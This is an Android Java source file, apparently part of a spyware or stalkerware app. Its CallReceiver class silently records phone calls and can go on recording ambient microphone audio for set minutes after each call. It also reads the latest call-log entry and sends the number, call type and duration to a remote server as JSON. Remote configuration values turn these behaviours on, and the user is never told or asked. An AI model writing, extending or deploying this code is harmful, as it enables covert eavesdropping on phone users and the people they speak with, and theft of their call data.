package com.inet.android.call;

import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.inet.android.audio.RecordAudio;
import com.inet.android.audio.RecordAudioV2;
import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * Class get call
 * 
 * @author johny homicide
 * 
 */
public class CallReceiver extends BroadcastReceiver {
	private static Context mContext;
	private static String LOG_TAG = CallReceiver.class.getSimpleName()
			.toString();
	private final static int SOURCE_RECORD = MediaRecorder.AudioSource.VOICE_CALL;
	private static int osCheck = 0;

	@Override
	public void onReceive(Context context, Intent intent) {
		CallReceiver.mContext = context;
		Logging.doLog(LOG_TAG,
				"intent: " + intent.getAction() + " " + intent.getExtras(),
				"intent: " + intent.getAction() + " " + intent.getExtras());

		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST,
				mContext) == 0)
			return;

		Bundle bundle = intent.getExtras();
		String callingSIM = String.valueOf(bundle.getInt("simId", -1));
		if (callingSIM == "0") {
			// Incoming call from SIM1
			Logging.doLog(LOG_TAG, "sim1", "sim1");
		} else if (callingSIM == "1") {
			// Incoming call from SIM2
			Logging.doLog(LOG_TAG, "sim2", "sim2");
		}
		if (intent.getAction()
				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
			// получаем исходящий номер
			Logging.doLog(LOG_TAG, "android.intent.action.NEW_OUTGOING_CALL ",
					"android.intent.action.NEW_OUTGOING_CALL");

		} else if (intent.getAction().equals(
				"android.intent.action.PHONE_STATE")) {
			String phoneState = intent
					.getStringExtra(TelephonyManager.EXTRA_STATE);
			Logging.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ",
					"android.intent.action.PHONE_STATE");

			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// телефон звонит, получаем входящий номер
				Logging.doLog(LOG_TAG, "EXTRA_STATE_RINGING ",
						"EXTRA_STATE_RINGING - ");

			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
						"TelephonyManager.EXTRA_STATE_OFFHOOK");
				
				String osVersion = android.os.Build.VERSION.RELEASE;
				Log.d(LOG_TAG, "android version: " + osVersion);
				if (osVersion.startsWith("5")) {
					Log.d(LOG_TAG, "osCheck = " + osCheck);
					if (osCheck == 1) {
						setRecord();
						osCheck = 0;
					} else {
						osCheck++;
					}
				} else {
					setRecord();
				}
				
				// телефон находится в режиме звонка (набор номера / разговор)
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// телефон находится в ждущем режиме (событие наступает по
				// окончании разговора,
				// когда уже знаем номер и факт звонка
				Logging.doLog(LOG_TAG, "EXTRA_STATE_IDLE ", "EXTRA_STATE_IDLE ");
				
				String osVersion = android.os.Build.VERSION.RELEASE;
				Log.d(LOG_TAG, "android version: " + osVersion);
				if (osVersion.startsWith("5")) {
					Log.d(LOG_TAG, "osCheck = " + osCheck);
					if (osCheck == 1) {
						setRecord();
						osCheck = 0;
					} else {
						osCheck++;
					}
				} else {
					setRecord();
				}
				
				stopRecord();
				try {
					// TimeUnit.SECONDS.sleep(1);
					TimeUnit.MILLISECONDS.sleep(1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				getCallDetails();
			}
		}
	}

	private void setRecord() {
		Log.d(LOG_TAG, "1 setRecord");
		if (ValueWork.getMethod(ConstantValue.RECORD_CALL, mContext) == 0)
			return;
//		if (RecordAudio.mRecording.get())
//			RecordAudio.executeStopRecording(SOURCE_RECORD, mContext);
		RecordAudioV2.executeRecording(-1, SOURCE_RECORD, mContext);
	}

	private void stopRecord() {
		Log.d(LOG_TAG, "stopRecord");
		if (RecordAudioV2.mRecording.get()) {
			RecordAudioV2.executeStopRecording();
			
			int minuteAfterCall = ValueWork.getMethod(
					ConstantValue.RECORD_ENVORIMENT, mContext);
			Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
					"recordAudio != null " + minuteAfterCall);
			if (minuteAfterCall == 0) {
				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
						"minuteAfterCall == 0");
				RecordAudioV2.checkStateRecord(mContext);
			} else {
				RecordAudioV2.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
//				Timer myTimer = new Timer(); // Создаем таймер
//				Logging.doLog(LOG_TAG, "Timer", "Timer");
//				myTimer.schedule(new TimerTask() { // Определяем задачу
//							public void run() {
//								// if(current == minuteAfterCall){
//								Logging.doLog(LOG_TAG, "executeStopRecording",
//										"executeStopRecording");
//								RecordAudio.executeStopRecording();
//
//							};
//						}, minuteAfterCall * 60 * 1000); // интервал - 60000
//															// миллисекунд, 0
//															// миллисекунд до
//															// первого запуска.

			}
		}
	}

	private void getCallDetails() {

		Cursor managedCursor = mContext.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, null);

		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		managedCursor.moveToLast();
		String phNumber = managedCursor.getString(number);
		String callType = managedCursor.getString(type);
		String callDuration = managedCursor.getString(duration);
		int callTypeStr = -1;

		int dircode = Integer.parseInt(callType);

		switch (dircode) {
		case CallLog.Calls.OUTGOING_TYPE:
			callTypeStr = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
			break;

		case CallLog.Calls.INCOMING_TYPE:
			callTypeStr = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
			break;

		case CallLog.Calls.MISSED_TYPE:
			callTypeStr = ConstantValue.TYPE_MISSED_CALL_REQUEST;
			break;
		}

		managedCursor.close();

		String sendJSONStr = null;
		JSONObject info = new JSONObject();
		JSONObject object = new JSONObject();

		try {

			info.put("number", phNumber);
			info.put("duration", callDuration);

			object.put("time", ConvertDate.logTime());
			object.put("type", callTypeStr);
			object.put("info", info);
			// sendJSONStr = jsonObject.toString();
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		}

		Logging.doLog(LOG_TAG, sendJSONStr);

		RequestList.sendDataRequest(sendJSONStr, mContext);
	}
}